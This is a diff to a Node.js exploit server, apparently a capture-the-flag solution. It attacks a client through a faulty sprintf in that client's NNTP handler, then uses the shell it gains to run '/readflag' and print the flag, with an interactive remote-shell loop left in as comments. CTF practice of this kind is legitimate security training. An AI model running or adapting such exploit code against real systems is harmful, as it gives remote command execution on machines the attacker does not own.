@@ -20,6 +20,7 @@ function helpers(socket) {
 
 const server = net.createServer(async (socket) => {
 	const { send, next } = helpers(socket);
+	console.log("Got a connection from", socket.remoteAddress);
 
 	// This exploit relies on a faulty sprintf in the NNTP handler.
 	// Specifically, there's a call that looks like:
@@ -104,12 +105,18 @@ const server = net.createServer(async (socket) => {
 
 	// If all went well, we have a shell now!
 
-	rl.createInterface(process.stdin, process.stdout)
-		.on("line", (chunk) => send(chunk + "\n"));
+	setTimeout(() => send("/readflag\n"), 50); // a bit of delay here seems to make it more stable
+	socket.once("data", (data) => console.log(data.toString())); // That's our flag!
 
-	while (true) {
-		await next();
-	}
+	// Interactive shell for poking around
+
+	// rl.createInterface(process.stdin, process.stdout)
+	// 	.on("line", (chunk) => send(chunk + "\n"));
+
+	// while (true) {
+	// 	await next();
+	// }
 });
 
 server.listen(12345);
+console.log("Server listening on :12345 -- submit news://this-machine-host:12345 to get a flag")
